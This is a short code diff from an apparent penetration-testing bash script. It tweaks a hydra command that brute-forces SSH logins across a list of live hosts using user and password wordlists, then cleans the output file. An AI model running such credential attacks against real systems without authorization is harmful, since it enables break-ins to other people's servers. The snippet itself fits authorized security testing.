@@ -187,7 +187,7 @@ function brute(){
 
 		#fi
 		#***** if not success with basic, then do full ****************************************
-		command hydra -o "$hydraOutput" -L "$userListScenario01" -P "$pwListScenario01" -M "$liveHosts" ssh
+		command hydra -I -o "$hydraOutput" -L "$userListScenario01" -P "$pwListScenario01" -vV -t 4 -M "$liveHosts" ssh
 		command sed -i '/^#/d' "$hydraOutput"
 		if [ -s $hydraOutput ]; then
 			printf "\nCleaning up output\n"
